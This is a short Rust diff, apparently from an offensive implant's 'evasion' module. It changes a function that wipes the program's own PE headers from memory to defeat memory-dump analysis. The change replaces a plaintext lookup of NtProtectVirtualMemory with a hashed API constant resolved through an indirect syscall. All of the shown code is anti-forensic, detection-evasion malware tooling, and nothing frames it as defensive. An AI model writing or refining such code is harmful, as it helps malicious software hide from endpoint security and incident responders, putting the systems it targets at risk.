@@ -21,7 +21,8 @@ unsafe fn get_own_image_base() -> *mut u8 {
 /// dumps unable to reconstruct the loader structure.
 #[cfg(target_os = "windows")]
 pub unsafe fn wipe_pe_headers() {
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
+    use crate::resolve::api_hash::h;
 
     let base = get_own_image_base();
     if base.is_null() { return; }
@@ -33,7 +34,7 @@ pub unsafe fn wipe_pe_headers() {
 
     let ph = usize::MAX; // -1 = current process
 
-    if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
+    if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
         let mut pbase = base as usize; let mut sz = size_of_headers; let mut old = 0u32;
         let r = indirect_syscall(prot_ssn, prot_tramp, ph,
             &mut pbase as *mut usize as usize, &mut sz as *mut usize as usize,
